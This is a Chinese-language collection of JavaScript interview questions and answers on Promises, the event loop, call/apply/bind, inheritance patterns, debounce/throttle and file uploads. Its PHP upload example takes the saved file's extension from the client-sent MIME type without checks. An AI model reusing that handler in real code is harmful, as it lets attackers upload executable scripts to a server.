Error(&#39;err1&#39;); &#125;) .then(() &#x3D;&gt; &#123;console.log(1);&#125;) .then(() &#x3D;&gt; &#123;console.log(2);&#125;) .catch((err) &#x3D;&gt; &#123; console.log(err); &#x2F;&#x2F;Err: err1 throw new Error(&#39;err2&#39;); &#125;) .catch((err) &#x3D;&gt; &#123;console.log(err);&#125;)&#x2F;&#x2F;Err: err2 一般来说，不要在then方法里面定义Reject状态的回调函数（即then的第二个参数），总是使用catch方法。 // bad new Promise() .then((data) => &#123;/* success */ &#125;, (err) => &#123;/* error */ &#125;); // good new Promise() .then((data) => &#123; /* success */ &#125;) .catch((err) => &#123;/* error */ &#125;); 上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面then方法执行中的错误，也更接近同步的写法。 与传统的try/catch代码块不同的是，即使没有使用catch方法指定错误处理的回调函数，Promise 对象抛出的错误也不会中止外部脚本运行。 new Promise((resolve) => &#123; // 下面一行会报错，因为x没有声明 resolve(x + 2); &#125;).then(() => &#123; console.log('ok'); &#125;); setTimeout(() => &#123;console.log('over')&#125;); //Uncaught (in promise) ReferenceError: x is not defined //over 在异步函数中抛出的错误不会被catch捕获到 new Promise((resolve, reject) &#x3D;&gt; &#123; setTimeout(() &#x3D;&gt; &#123; throw &#39;Uncaught Exception!&#39;; &#125;, 1000); &#125;).catch(() &#x3D;&gt; &#123; console.log(&#39;err&#39;); &#x2F;&#x2F;不会执行 &#125;); new Promise((resolve, reject) &#x3D;&gt; &#123; setTimeout(() &#x3D;&gt; &#123; reject(); &#125;, 1000); &#125;).catch(() &#x3D;&gt; &#123; console.log(&#39;err&#39;); &#x2F;&#x2F;err &#125;); 在resolve()后面抛出的错误会被忽略 new Promise((resolve, reject) => &#123; resolve(); throw 'Silenced Exception!'; &#125;).catch(function(e) &#123; console.log(e); // 不会执行 &#125;); Promise.all(iterable) 语法var p = Promise.all([p1, p2, p3]); 含义Promise.all方法接受一个数组作为参数，p1、p2、p3都是 Promise 实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。）p的状态由p1、p2、p3决定，分成两种情况。(1) 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。(2) 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。 用法 const p1 = 'p1-ok'; const p2 = Promise.resolve('p2-ok'); const p3 = new Promise((resolve) => setTimeout(resolve, 3000, 'p3-ok')); const p4 = Promise.reject('p4-err'); Promise.all([p1, p2, p3]) .then((resolves) => &#123; resolves.forEach(resolve => &#123; console.log(resolve); //p1-ok p2-ok p3-ok &#125;); &#125;) .catch(() => &#123; console.log('err'); &#125;); Promise.all([p1, p2, p3, p4]) .then(() => &#123; console.log('ok'); &#125;) .catch((err) => &#123; console.log(err); //p4-err &#125;) Promise.race(iterable) 语法var p = Promise.race([p1, p2, p3]); 含义Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数。Promise.race方法的参数与Promise.all方法一样，如果不是 Promise 实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。 用法 var p1 = new Promise(resolve => &#123;setTimeout(resolve, 500, \"one\");&#125;); var p2 = new Promise(resolve => &#123;setTimeout(resolve, 100, \"two\");&#125;); Promise.race([p1, p2]) .then(value => &#123; console.log(value); // \"two\" &#125;); var p3 = new Promise(resolve => &#123;setTimeout(resolve, 100, \"three\");&#125;); var p4 = new Promise((resolve, reject) => &#123;setTimeout(reject, 500, \"four\");&#125;); Promise.race([p3, p4]) .then((value) => &#123; console.log(value); // \"three\" &#125;) .catch(err => &#123; // 未被调用 &#125;); var p5 = new Promise(resolve => &#123;setTimeout(resolve, 500, \"five\");&#125;); var p6 = new Promise((resolve, reject) => &#123; setTimeout(reject, 100, \"six\"); &#125;); Promise.race([p5, p6]) .then((value) => &#123; // 未被调用 &#125;).catch((reason) => &#123; console.log(reason); // \"six\" &#125;); Promise.resolve(value) 语法 Promise.resolve(value); Promise.resolve(promise); Promise.resolve(thenable); Promise.resolve等价于下面的写法。 Promise.resolve(value) ; // 等价于 new Promise(resolve => resolve(value)); 含义返回一个状态由给定value决定的Promise实例。 用法(1) 如果该值是一个Promise对象，则直接返回该对象； const p = new Promise((resolve) => &#123;resolve()&#125;); const p2 = Promise.resolve(p); console.log(p === p2); //true (2) 如果参数是thenable对象(即带有then方法的对象)，则返回的Promise对象的最终状态由then方法的执行决定； const thenable = &#123; then(resolve, reject) &#123; resolve(42); &#125; &#125;; Promise.resolve(thenable) .then((value) => &#123; console.log(value); // 42 &#125;); (3) 如果参数是不具有then方法的对象或基本数据类型，则返回的Promise对象的状态为fulfilled，并且将该参数传递给then方法。 Promise.resolve('Hello') .then((s) => &#123; console.log(s); //Hello &#125;); (4) 如果不带有任何参数，则返回的Promise对象的状态为fulfilled，并且将undefined作为参数传递给then方法。 Promise.resolve() .then((s) => &#123; console.log(s); //undefined &#125;); 通常而言，如果你不知道一个值是否是Promise对象，使用Promise.resolve(value) 来返回一个Promise对象,这样就能将该value以Promise对象形式使用。 立即resolve的Promise对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。 setTimeout(function () &#123; console.log('three'); &#125;, 0); Promise.resolve().then( () => &#123; console.log('two'); &#125;); console.log('one'); // one // two // three Promise.reject(reason) 语法 Promise.reject(reason); Promise.reject等价于下面的写法。 var p = Promise.reject(reason); // 等同于 var p = new Promise((resolve, reject) => reject(reason)); 含义返回一个状态为rejected的Promise对象，并将给定的失败信息传递给对应的处理方法。 注意：Promise.resolve(value)方法返回的Promise实例的状态由value决定，可能是fulfilled，也可能是rejected。Promise.reject(reason)方法返回的Promise实例的状态一定是rejected。 用法 Promise.reject(\"Testing static reject\") .then((value) => &#123; // 未被调用 &#125;).catch((reason) => &#123; console.log(reason); // Testing static reject &#125;); Promise.reject(new Error(\"fail\")) .then((value) => &#123; // 未被调用 &#125;).catch((error) => &#123; console.log(error); // Error: fail &#125;); Promise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数。这一点与Promise.resolve方法不一致。 const thenable = &#123; then(resolve) &#123; resolve('ok'); &#125; &#125;; Promise.resolve(thenable) .then(e => &#123; console.log(e === 'ok'); //true &#125;); Promise.reject(thenable) .catch(e => &#123; console.log(e === thenable); // true &#125;); 与promise.all相反的是哪一个 参考答案： Promse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。 扩展： 语法 Promise.race(iterable); 参数 iterable 可迭代对象，类似Array 返回值 一个待定的 Promise]只要给定的迭代中的一个promise解决或拒绝，就采用第一个promise的值作为它的值， 从而异步地解析或拒绝（一旦堆栈为空） 33、promise实现文件读取 // const fs = require(\"fs\"); import fs from \"fs\"; import path from \"path\"; const __dirname = path.resolve(); function readFile(file) &#123; return new Promise((resolve, reject) => &#123; fs.readFile(path.join(__dirname, file), (err, data) => &#123; if (data) &#123; resolve(data.toString()); &#125; else &#123; reject(err); &#125; &#125;); &#125;); &#125; readFile(\"./JavaScript/promise/file/file1.txt\") .then((data) => &#123; console.log(data); return readFile(\"./JavaScript/promise/file/file1.txt\"); &#125;) .then((data) => &#123; console.log(data); &#125;); 33、用js实现sleep，用promisefunction SLeep_p(time) &#123; return new Promise((resolve, reject) => &#123; setTimeout(resolve, time); &#125;); &#125; SLeep_p(2000).then(() => &#123; console.log(\"kif\"); &#125;); 34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.thenconsole.time('start'); setTimeout(function() &#123; console.log(2); &#125;, 10); setImmediate(function() &#123; console.log(1); &#125;); new Promise(function(resolve) &#123; console.log(3); resolve(); console.log(4); &#125;).then(function() &#123; console.log(5); console.timeEnd('start') &#125;); console.log(6); process.nextTick(function() &#123; console.log(7); &#125;); console.log(8); 参考答案： 综合的执行顺序就是： 3——&gt;4——&gt;6——&gt;8——&gt;7——&gt;5——&gt;start: 7.009ms——&gt;1——&gt;2 解析： 本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下： 所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack) 在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务 一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行 主线程不断重复上面的第三步 在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出3、4、6、8。当主线程任务执行完毕后，再从Event Loop中读取任务。 Event Loop读取任务的先后顺序，取决于任务队列（Job queue）中对于不同任务读取规则的限定。 在Job queue中的队列分为两种类型： 宏任务 Macrotask 宏任务是指Event Loop在每个阶段执行的任务 微任务 Microtask 微任务是指Event Loop在每个阶段之间执行的任务 我们举例来看执行顺序的规定，我们假设 宏任务队列包含任务: A1, A2 , A3 微任务队列包含任务: B1, B2 , B3 执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。 了解完了宏任务 Macrotask和微任务 Microtask两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示： 宏任务 Macrotask队列真实包含任务： script(主程序代码),setTimeout, setInterval, setImmediate, I&#x2F;O, UI rendering 微任务 Microtask队列真实包含任务： process.nextTick, Promises, Object.observe, MutationObserver 由此我们得到的执行顺序应该为： script(主程序代码)—&gt;process.nextTick—&gt;Promises...——&gt;setTimeout——&gt;setInterval——&gt;setImmediate——&gt; I&#x2F;O——&gt;UI rendering 在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs 我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的 接下来我们分析我们的题目，首先分析Job queue的执行顺序： script(主程序代码)——&gt;process.nextTick——&gt;promise——&gt;setTimeout——&gt;setImmediate 主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序） process.nextTick: 输出7 promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd(‘start’) setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时 setTimeout ： 输出2 35、call appy bind的作用和区别参考答案： 作用： 都可以改变函数内部的this指向。 区别点： call 和 apply 会调用函数，并且改变函数内部this指向。 call 和 apply 传递的参数不一样，call 传递参数arg1,arg2…形式 apply 必须数组形式[arg] bind 不会调用函数，可以改变函数内部this指向。 解析： call方法 改变函数内部this指向 call()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。 写法：fun.call(thisArg, arg1, arg3, …) &#x2F;&#x2F; thisArg为想要指向的对象，arg1,arg3为参数 call 的主要作用也可以实现继承 apply方法 apply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。 写法：fun.apply(thisArg, [argsArray]) thisArg:在fun函数运行时指定的this值 argsArray:传递的值，必须包含在数组里面 返回值就是函数的返回值，因为他就是调用函数 apply的主要应用，比如可以利用apply可以求得数组中最大值 const arr &#x3D; [1, 22, 3, 44, 5, 66, 7, 88, 9];&#96;&#96;const max &#x3D; Math.max.apply(Math, arr);&#96;&#96;console.log(max); bind方法 bind()方法不会调用函数，但是能改变函数内部this指向 写法：fun.bind(thisArg, arg1, arg2, …) thisArg:在fun函数运行时指定的this值 arg1,arg2:传递的其他参数 返回由指定的this值和初始化参数改造的原函数拷贝 var&#96; &#96;o &#x3D; &#123;&#96;&#96; &#96;&#96;name: &#96;&#96;&quot;lisa&quot;&#96;&#96;&#125;;&#96;&#96;function&#96; &#96;fn() &#123;&#96;&#96; &#96;&#96;console.log(&#96;&#96;this&#96;&#96;);&#96;&#96;&#125;&#96;&#96;var&#96; &#96;f &#x3D; fn.bind(o);&#96;&#96;f(); bind应用 如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向，此时用bind再合适不过了 const btns &#x3D; document.querySelectorAll(&#96;&#96;&quot;button&quot;&#96;&#96;);&#96;&#96;for&#96; &#96;(let i &#x3D; 0; i &lt; btns.length; i++) &#123;&#96;&#96; &#96;&#96;btns[i].onclick &#x3D; &#96;&#96;function&#96;&#96;() &#123;&#96;&#96; &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;true&#96;&#96;;&#96;&#96; &#96;&#96;setTimeout(&#96;&#96; &#96;&#96;function&#96;&#96;() &#123;&#96;&#96; &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;false&#96;&#96;;&#96;&#96; &#96;&#96;&#125;.bind(&#96;&#96;this&#96;&#96;),&#96;&#96; &#96;&#96;2000&#96;&#96; &#96;&#96;);&#96;&#96; &#96;&#96;&#125;;&#96;&#96;&#125; 扩展: 主要应用场景： call 经常做继承。 apply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。 bind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。 手写bind// bind体验 // 改变this指向 function func(...args) &#123; console.log(this) console.log(args) &#125; // func(1, 2, 3, 4) // undefined // [ 1, 2, 3, 4 ] let Fu = func.bind(&#123; a: 1 &#125;, 1, 2, 3, 4) // Fu() // &#123; a: 1 &#125; // [ 1, 2, 3, 4 ] let Fu2 = func.bind(1, 1, 2, 3, 4) // Fu2() // 1 // [ 1, 2, 3, 4 ] // bind实现思路： // 判断是否是函数调用，若非函数调用抛出异常 // 返回函数 // 判断函数的调用方式，是否是被new出来的 // new出来的话，返回空对象，但是实例的 __ proto__ 指向_this的prototype var age = 16; var gender = 'female'; var obj = &#123; age: 11, gender: 'male' &#125; function Test(a, b) &#123; // console.log(this.age); // console.log(this.gender); console.log(this) if (this) &#123; console.log(this.age); console.log(this.gender); &#125; console.log(a); console.log(b); &#125; Test.bind(obj, 3, 7)() Function.prototype.myBind = function (obj, ...args) &#123; obj.fn = this let result return function () &#123; result = obj.fn(...args) delete obj.fn return result &#125; &#125; Test.myBind(obj,3,8)() 手写call// 思路 // 判断是否是函数调用，若非函数调用抛异常 // 通过新对象（context）来调用函数 // 给context创建一个fn设置为需要调用的函数 // 结束调用完之后删除fn // Function.prototype.myCall = function (contents) &#123; // //判断是否是函数调用，不是就抛出异常 // //这里的this 就是调用my_call的 // if (typeof this !== 'function') &#123; // return // &#125; // // 不传参默认为window // contents = contents || window // // 保存this // contents.fn = this // // 获取参数 // let args = [...arguments].slice(1) // let result = contents.fn(...args) // delete contents.fn // return result // &#125; var age = 16; var gender = 'female'; var obj = &#123; age: 11, gender: 'male' &#125; function Test(a, b) &#123; // console.log(this.age); // console.log(this.gender); console.log(this) if (this) &#123; console.log(this.age); console.log(this.gender); &#125; console.log(a); console.log(b); &#125; // Test(3, 5); // Test.call(obj, 22, 33); Function.prototype.myCall = function (obj, ...args) &#123; if (typeof this !== 'function') &#123; return &#125; obj.fn = this let result = obj.fn(...args) delete obj.fn return result &#125; Test.myCall(obj,3,6) 手写apply// 思路 // 判断是否是函数调用，若非函数调用抛异常 // 通过新对象（context）来调用函数 // 给context创建一个fn设置为需要调用的函数 // 结束调用完之后删除fn Function.prototype.myApply = function (context) &#123; if (typeof this !== 'function') &#123; return &#125; context = context || window context.fn = this let args = [...arguments].slice(1) let result = context.fn(...args) delete context.fn return result &#125; 36、继承，优缺点参考答案： 继承的好处 a：提高了代码的复用性 b：提高了代码的维护性 c：让类与类之间产生了关系，是多态的前提 继承的弊端 类的耦合性增强了,但是开发的原则：高内聚，低耦合。 37、ES5 js继承的方法和优缺点参考答案： 原型链继承 实现方式：将子类的原型链指向父类的对象实例 function Parent()&#123; this.name = \"parent\"; this.list = ['a']; &#125; Parent.prototype.sayHi = function()&#123; console.log('hi'); &#125; function Child()&#123; &#125; Child.prototype = new Parent(); var child = new Child(); console.log(child.name); child.sayHi(); 原理：子类实例child的__proto__指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的__proto__指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性缺点：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下： var a = new Child(); var b = new Child(); a.list.push('b'); console.log(b.list); // ['a','b'] 构造函数继承 实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数 function Parent(name, id)&#123; this.id = id; this.name = name; this.printName = function()&#123; console.log(this.name); &#125; &#125; Parent.prototype.sayName = function()&#123; console.log(this.name); &#125;; function Child(name, id)&#123; Parent.call(this, name, id); // Parent.apply(this, arguments); &#125; var child = new Child(\"jin\", \"1\"); child.printName(); // jin child.sayName() // Error 原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性优点：可解决原型链继承的缺点缺点：不可继承父类的原型链方法，构造函数不可复用 组合继承 原理：综合使用构造函数继承和原型链继承 function Parent(name, id)&#123; this.id = id; this.name = name; this.list = ['a']; this.printName = function()&#123; console.log(this.name); &#125; &#125; Parent.prototype.sayName = function()&#123; console.log(this.name); &#125;; function Child(name, id)&#123; Parent.call(this, name, id); // Parent.apply(this, arguments); &#125; Child.prototype = new Parent(); var child = new Child(\"jin\", \"1\"); child.printName(); // jin child.sayName() // jin var a = new Child(); var b = new Child(); a.list.push('b'); console.log(b.list); // ['a'] 优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的缺点：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数 原型式继承 原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的__proto__指向父对象 var parent = &#123; names: ['a'] &#125; function copy(object) &#123; function F() &#123;&#125; F.prototype = object; return new F(); &#125; var child = copy(parent); 缺点：共享引用类型 寄生式继承 原理：二次封装原型式继承，并拓展 function createObject(obj) &#123; var o = copy(obj); o.getNames = function() &#123; console.log(this.names); return this.names; &#125; return o; &#125; 优点：可添加新的属性和方法 寄生组合式继承 原理：改进组合继承，利用寄生式继承的思想继承原型 function inheritPrototype(subClass, superClass) &#123; // 复制一份父类的原型 var p = copy(superClass.prototype); // 修正构造函数 p.constructor = subClass; // 设置子类原型 subClass.prototype = p; &#125; function Parent(name, id)&#123; this.id = id; this.name = name; this.list = ['a']; this.printName = function()&#123; console.log(this.name); &#125; &#125; Parent.prototype.sayName = function()&#123; console.log(this.name); &#125;; function Child(name, id)&#123; Parent.call(this, name, id); // Parent.apply(this, arguments); &#125; inheritPrototype(Child, Parent); 38、ES6继承class Parent &#123; constructor() &#123; this.name = \"kif\"; this.age = 12; &#125; &#125; class Child extends Parent &#123; constructor(id) &#123; super(); this.id = id; &#125; &#125; let p = new Child(); console.log(p.name); 39、扩展操作符…适用类型：数组、对象、字符串。 复杂数据类型都可以，当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作。 基础数据只有string可以使用扩展运算符，number,boolean,null,undefined无效 扩展运算符的应用场景 // 1、函数调用 function add(x, y) &#123; return x + y; &#125; add(...[4, 38]); function f(v, w, x, y, z) &#123; &#125; f(-1, ...[0, 1], 2, ...[3]); // 123456789 //2.往数组里push多个元素 var arr1 = [0, 1, 2]; var arr2 = [3, 4, 5]; arr1.push(...arr2); console.log(arr1); //[0,1,2,3,4,5] //123456 //3.替代函数的apply方法 function f(x, y, z) &#123; &#125; var args = [0, 1, 2]; f.apply(null, args); //ES5 的写法 f(...args); //ES6的写法 // 123456 //4.求一个数组的最大数简化 Math.max.apply(null, [14, 3, 77]) //ES5 的写法 Math.max(...[14, 3, 77]) //ES6 的写法，等同于Math.max(14, 3, 77) //1234 //5.扩展运算符后面可以放表达式 const arr = [...(5 > 0 ? ['a'] : []),'b']; console.log(arr); //['a','b'] //1234 //6.与解构赋值结合，用于生成数组 const a1 = [1, 2]; const a2 = [...a1]; //写法1 const [...a2] = a1; //写法2 const [first, ...rest] = [1, 2, 3, 4, 5]; first //1 rest //[2, 3, 4, 5] const [first, ...rest] = []; first //undefined rest //[] const [first, ...rest] = [\"foo\"]; first //\"foo\" rest //[] //1234567891011121314151617 //7.合并数组 [...arr1, ...arr2, ...arr3] //[ 'a', 'b', 'c', 'd', 'e' ] //8.数组的克隆——————————————————————特别注意 var arr1 = [0, 1, 2]; var arr2 = [...arr1]; arr1[0]=100; console.log(arr2); //[0, 1, 2] /* 乍一看，arr2与arr1不共用引用地址，arr2不随着arr1变化，接着往下看 */ var arr1 = [0, [1,11,111], 2]; var arr2 = [...arr1]; arr1[1][0]=100; console.log(arr2); //[0, [100,11,111], 2] 40、为什么js是单线程参考答案： 这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变 扩展： 什么是进程？ 进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位） 什么是线程？ 线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程） 浏览器是多进程的？ 放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。 为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。 41、死锁参考答案： 死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行 产生原因 竞争资源引起进程死锁 可剥夺和非剥夺资源 竞争非剥夺资源 竞争临时性资源 进程推进顺序不当 产生条件 互斥条件：涉及的资源是非共享的 涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放 不剥夺条件：不能强行剥夺进程拥有的资源 进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放 请求和保持条件：进程在等待一新资源时继续占有已分配的资源 指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放 环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链 解决办法 只要打破四个必要条件之一就能有效预防死锁的发生 42、面向对象的三个特征，分别说一下什么意思参考答案： 概念： 封装：将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。 继承： 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。 多态： 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。 特点： 封装可以隐藏实现细节，使得代码模块化； 继承可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。 多态就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态 43、防抖和节流的原理和使用场景参考答案： 函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。 防抖： 在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。 根据函数防抖思路设计出第一版的最简单的防抖代码： var timer; &#x2F;&#x2F; 维护同一个timer function debounce(fn, delay) &#123; clearTimeout(timer); timer &#x3D; setTimeout(function()&#123; fn(); &#125;, delay); &#125; 上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。 在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。 优化后的代码： function debounce(fn, delay) &#123; var timer; // 维护一个 timer return function () &#123; var _this = this; // 取debounce执行作用域的this var args = arguments; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(function () &#123; fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args); &#125;, delay); &#125;; &#125; 使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。 节流： 每隔一段时间，只执行一次函数。 定时器实现节流函数： function throttle(fn, delay) &#123; var timer; return function () &#123; var _this = this; var args = arguments; if (timer) &#123; return; &#125; timer = setTimeout(function () &#123; fn.apply(_this, args); timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器 &#125;, delay) &#125; &#125; 时间戳实现节流函数： function throttle(fn, delay) &#123; var previous = 0; // 使用闭包返回一个函数并且用到闭包函数外面的变量previous return function() &#123; var _this = this; var args = arguments; var now = new Date(); if(now - previous > delay) &#123; fn.apply(_this, args); previous = now; &#125; &#125; &#125; 异同比较 相同点： 都可以通过使用 setTimeout 实现。 目的都是，降低回调执行频率。节省计算资源。 不同点： 函数防抖，在一段连续操作结束后，处理回调，利用clearTimeout 和 setTimeout实现。函数节流，在一段连续操作中，每一段时间只执行一次，频率较高的事件中使用来提高性能。 函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。 常见应用场景 函数防抖的应用场景: 连续的事件，只需触发一次回调的场景有： 搜索框搜索输入。只需用户最后一次输入完，再发送请求 手机号、邮箱验证输入检测 窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。 函数节流的应用场景: 间隔一段时间执行一次回调的场景有： 滚动加载，加载更多或滚到底部监听 谷歌搜索框，搜索联想功能 高频点击提交，表单重复提交 44、文件异步上传怎么实现参考答案： 1.普通表单上传使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为enctype=&quot;multipart/form-data&quot;，表明表单需要上传二进制数据。 &lt;form action=\"/index.php\" method=\"POST\" enctype=\"multipart/form-data\"> &lt;input type=\"file\" name=\"myfile\"> &lt;input type=\"submit\"> &lt;/form> 然后编写index.php上传文件接收代码，使用move_uploaded_file方法即可(php大法好…) $imgName = 'IMG'.time().'.'.str_replace('image/','',$_FILES[\"myfile\"]['type']); $fileName = 'upload/'.$imgName; // 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功 if (move_uploaded_file($_FILES['myfile']['tmp_name'], $fileName))&#123; echo $fileName; &#125;else &#123; echo \"nonn\"; &#125; form表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。 2.文件编码上传第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递 var imgURL = URL.createObjectURL(file); ctx.drawImage(imgURL, 0, 0); // 获取图片的编码，然后将图片当做是一个很长的字符串进行传递 var data = canvas.toDataURL(\"image/jpeg\", 0.5); 在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可 $imgData = $_REQUEST['imgData']; $base64 = explode(',', $imgData)[1]; $img = base64_decode($base64); $url = './test.jpg'; if (file_put_contents($url, $img)) &#123; exit(json_encode(array( url => $url ))); &#125; base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。 更多关于base64的知识，可以参考Base64笔记。 除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传 // 读取二进制文件 function readBinary(text)&#123; var data = new ArrayBuffer(text.length); var ui8a = new Uint8Array(data, 0); for (var i = 0; i &lt; text.length; i++)&#123; ui8a[i] = (text.charCodeAt(i) &amp; 0xff); &#125; console.log(ui8a) &#125; var reader = new FileReader(); reader.onload = function()&#123; readBinary(this.result) // 读取result或直接上传 &#125; // 把从input里读取的文件内容，放到fileReader的result字段里 reader.readAsBinaryString(file); 3.formData异步上传FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键&#x2F;值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。 let files = e.target.files // 获取input的file对象 let formData = new FormData(); formData.append('file', file); axios.post(url, formData); 服务端处理方式与直接form表单请求基本相同。 4.iframe无刷新页面在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的target属性导致的，其取值有 _self，默认值，在相同的窗口中打开响应页面 _blank，在新窗口打开 _parent，在父窗口打开 _top，在最顶层的窗口打开 framename，在指定名字的iframe中打开 